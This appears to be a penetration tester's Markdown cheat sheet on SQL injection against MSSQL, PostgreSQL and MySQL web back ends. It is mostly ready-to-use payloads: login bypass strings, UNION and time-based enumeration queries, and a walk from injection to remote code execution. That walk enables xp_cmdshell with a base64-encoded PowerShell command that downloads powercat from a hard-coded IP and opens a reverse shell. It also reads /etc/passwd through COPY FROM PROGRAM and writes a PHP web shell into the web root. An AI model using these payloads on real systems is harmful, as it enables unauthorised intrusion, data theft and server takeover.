# SQL Injection

On Kali, to connect to an MSSQL database on a Windows machine, do:

```
impacket-mssqlclient ${USER}:${PW}@${RHOST} -windows-auth
```

Start by giving it simple queries that tell you something about what query the web application is attempting to make.
Then, use [these payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md) for inspiration on enumeration.

## Error based

When logging into an application, you might see errors from the underlying databases.
This can be a sign of potential for SQL injection.
A good starting point to check for that would be:

```
admin' OR 1=1 -- //
```

This is good against queries such as `SELECT * from users where user=$user and pw=$pw`.
The early `' OR 1=1 -- //` is an attempt at ending the query early by outcommenting the `and...` statement and instead evaluating `1=1`.


A good trick for error based injection, once you have a simple query, is to  `CAST` the value you want to a wrong type:

```
' Union SELECT null, CAST(CURRENT_USER as int), null, null, null, null from user
```

so that the value shows up in the error on the web page.

*Note* the `null,` as the first part of the select-statement.
doing a `CAST` directly after `SELECT` didn't work with postgresql.

### In-band Union based injection

When the results are shown on the page, it can be good to attempt a Union based attack.
This often happens when the underlying database runs a query like

```
SELECT * WHERE UserInfo LIKE $userInput
```
and the result is simply shown on the corresponding website.
Start by enumerating the number of collumns in the table.
Once that is done, you will be able to get a number of columns where you can see the output 


then, we can do futher enumeration like:

```
' UNION SELECT null, user(), @@version, database(), null, null  -- //
```
or enumeration queries as seen in the bottom of this note document.


Obscure way to check if a user is superuser:

```
SELECT usesuper, CASE WHEN (usesuper = true) THEN 1/(SELECT 0) ELSE (SELECT 0) END from pg_user where usename = CURRENT_USER
```

## Blind SQLi


To test for blind boolean-based SQLi, do something like:

```
admin' AND 1=1 -- //
```

This will only return true if the `admin` user exists.

Similarly, for time-based SQLi, we can do something like:

```
admin' AND IF (1=1, sleep(4),'false') 
```
which will return after 4 seconds when `admin` exists.


For time-based SQLi, do something like this with MSSQL:

```
admin' UNION SELECT null, null IF EXISTS (SELECT table_catalog, table_name FROM information_schema.columns WHERE table_name = 'users') waitfor delay '0:0:10'
```
If you don't want to use the `EXISTS` keyword, you can do stuff like:

```
admin' UNION SELECT null, null IF ((SELECT COUNT (*) FROM users) = 0) waitfor delay '0:0:10' -- //
```
keep in mind if the `users` table doesn't exist, this query does not wait.


## Good enumeration queries for MySQL

```
SELECT table_name FROM information_schema.tables
```
equivalent to `SHOW DATABASES`:
```
SELECT schema_name 
FROM information_schema.schemata;
```



## In Practice: Getting RCE from SQLi

### MSSQL (Error Based)

Assume we find an input field on a website vulnerable to SQLi in MSSQL, the process goes like this:

in burp, assume we can set the Username like this:

```
Username=admin'+UNION+SELECT+1,2--//
```

And execute SQL.

Start by using this statement to figure out how many columns are in the table we are querying:

Starting out `UNION SELECT 1 --//`
and add `,2,3,4,5...` one at a time until you don't get an error
Now, you know how many colums are in the table you are querying.



Now, let's see if we can get a shell.
Looks like we can execute arbitrary SQL on the machine by terminating the statement with ; and running:

```
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
EXEC master.dbo.xp_cmdshell 'powershell -enc $ENCODED_REV_SHELL';
```

This could for instance look like this for the final statement:

```
Username=admin';EXEC master.dbo.xp_cmdshell 'powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAwADoAOAAwAC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAwACAALQBwACAANAA0ADMAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAA==';--//
```


### PostgreSQL (Error Based)


Assume we have a parameter on a site that is vulnerable, and we figure out the db is postgresql on a linux machine:

Now, we can do stuff like:


```
'; SELECT 1=cast((SELECT current_user) as int) --
```

This will attempt to cast the username as an int, throwing an exception.
Assume the result is  `joe`.
We can check if `joe` is a superuser with:


```
'; SELECT usesuper, CASE WHEN (usesuper = true) THEN 1/(SELECT 0) ELSE (SELECT 0) END from pg_user where usename = 'joe' --
```

This will give a divison by zero error if `joe` is a superuser.
If he is, and the postgresql server is in certain versions, we can now get RCE with:

```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'cat /etc/passwd';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

This could be done by downloading and running a `shell.sh`.


### MySQL (Error Based)

Assuming we have some field that's vulnerable, and the web server is a php server with a MySQL backend.
Note that this example stops the query with `#` as MySQL uses that as a comment character.
If the param is `email=`, let's start by figuring out the number of colums in the table being queried:

 ```
email=hacks%40hacks.com' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36 #
```
Assume we can see it complains about column 5. So the query being made is made to a table with 4 columns. 

Then, we can write a shell we can exploit:

```
email=hacks%40hacks.com' UNION SELECT null, "<?php echo shell_exec($_GET['cmd']);?>", null, null into OUTFILE '/var/www/html/shell.php' #
```

Now, we can access `shell.php` in `/shell.php`.


(note, for windows, we can put it in `C:/inetpub/wwwroot/shell.php`)





